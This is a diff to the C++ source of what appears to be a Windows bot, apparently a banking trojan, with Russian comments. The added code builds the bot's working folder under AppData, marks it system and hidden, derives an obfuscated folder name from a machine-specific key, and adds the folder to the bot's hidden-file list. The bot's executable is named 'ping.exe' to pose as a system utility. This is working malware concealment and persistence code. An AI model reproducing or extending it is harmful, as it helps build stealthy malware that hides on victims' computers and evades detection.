@@ -3,6 +3,17 @@
 #include <shlobj.h>
 
 #include "BotCore.h"
+#include "StrConsts.h"
+
+
+// Максимальный размер имени рабочего каталога
+#define MAX_BOT_WORK_FOLDER_LEN 15
+
+// Рабочий каталог бота
+char BOT_WORK_FOLDER_NAME[MAX_BOT_WORK_FOLDER_LEN + 1] = {0};
+
+
+
 
 
 WCHAR BOT_FILE_NAME[] = {'\\','p','i','n','g','.','e','x','e',0};
@@ -286,3 +297,78 @@ void DisableShowFatalErrorDialog()
 
 
 
+
+//----------------------------------------------
+//  MakeBotPath - Функция возвращает путь к
+//  системной папке, где бот будет хранить свои
+//  данные
+//----------------------------------------------
+string BOT::MakeBotPath()
+{
+	int CSIDL =  CSIDL_COMMON_APPDATA;
+	// Временный патч. В Висте и старше получаем папку текущего юзера
+	#ifdef USE_CURRENT_USER
+		OSVERSIONINFOEXA OSVersion;
+		OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
+		if (pGetVersionExA(&OSVersion))
+		{
+			if (OSVersion.dwMajorVersion >= 6)
+				CSIDL =  CSIDL_APPDATA;
+		}
+	#endif
+	// Создаём путь
+	return GetSpecialFolderPathA(CSIDL, NULL);
+}
+
+//----------------------------------------------
+//  MakeWorkPath Функция создаёт рабочую папку
+//               бота и возвращает путь к ней
+//  Адрес будет поддиректорией папку адрес
+//  которой вернёт функция MakeBotPath()
+//----------------------------------------------
+string BOT::MakeWorkPath()
+{
+	// Функция генерирует рабочий путь
+	string Result = MakeBotPath();
+	Result += MakeWorkFolder();
+	Result += "\\";
+
+	if (!DirExists(Result.t_str()))
+	{
+		pCreateDirectoryA(Result.t_str(), NULL);
+		pSetFileAttributesA(Result.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
+    }
+	return Result;
+}
+
+
+//-------------------------------------------
+// MakeWorkFolder - Функция генерирует имя
+//                  рабочего каталога бота
+//                  (короткое имя)
+//-------------------------------------------
+PCHAR BOT::MakeWorkFolder()
+{
+	if (!STRA::IsEmpty(BOT_WORK_FOLDER_NAME))
+		return BOT_WORK_FOLDER_NAME;
+
+	// Генерируем имя на основе константы обработанной ключём из уида
+	string WorkPath = GetStr(StrBotWorkPath);
+
+	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath.t_str(), false);
+
+	// Копируем путь в глобальный массив
+	const char *Buf = (Name) ? Name : WorkPath.t_str();
+
+	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));
+
+	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
+	BOT_WORK_FOLDER_NAME[ToCopy] = 0;
+
+	STR::Free(Name);
+
+	// Добавляем папку в список скрытых файлов
+	BOT::AddHiddenFile(STRA::Hash(BOT_WORK_FOLDER_NAME));
+
+	return BOT_WORK_FOLDER_NAME;
+}
